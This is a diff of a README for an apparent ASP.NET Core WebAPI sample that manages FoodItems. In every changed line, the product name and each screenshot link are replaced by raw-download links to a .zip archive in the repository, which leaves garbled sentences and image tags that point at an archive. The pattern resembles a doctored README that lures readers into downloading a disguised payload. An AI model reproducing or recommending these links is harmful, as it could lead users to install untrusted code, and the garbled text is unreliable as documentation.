@@ -1,6 +1,6 @@
-# https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip Core WebApi Sample with HATEOAS, Versioning & Swagger
+# https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip Core WebApi Sample with HATEOAS, Versioning & Swagger
 
-In this repository I want to give a plain starting point at how to build a WebAPI with https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip Core.
+In this repository I want to give a plain starting point at how to build a WebAPI with https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip Core.
 
 This repository contains a controller which is dealing with FoodItems. You can GET/POST/PUT/PATCH and DELETE them.
 
@@ -12,19 +12,19 @@ See the examples here:
 
 ``` http://localhost:29435/swagger ```
 
-![ASPNETCOREWebAPIVersions](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIVersions](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 ## GET all Foods
 
 ``` http://localhost:29435/api/v1/foods ```
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 ## GET single food
 
 ``` http://localhost:29435/api/v1/foods/2 ```
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 ## POST a foodItem
 
@@ -39,7 +39,7 @@ See the examples here:
   }
 ```
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 ## PUT a foodItem
 
@@ -54,7 +54,7 @@ See the examples here:
 }
 ```
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 
 ## PATCH a foodItem
@@ -67,11 +67,11 @@ See the examples here:
 ]
 ```
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
 
 ## DELETE a foodItem
 
 ``` http://localhost:29435/api/v1/foods/5 ```
 
 
-![ASPNETCOREWebAPIGET](https://raw.githubusercontent.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/main/SampleWebApiAspNetCore/Models/Core_AP_Web_ASPNET_Sample_v1.8-alpha.3.zip)
+![ASPNETCOREWebAPIGET](https://github.com/Shankar-naik-123/ASPNETCore-WebAPI-Sample/raw/refs/heads/main/SampleWebApiAspNetCore/MappingProfiles/Sample-Core-Web-ASPNET-AP-2.3-alpha.3.zip)
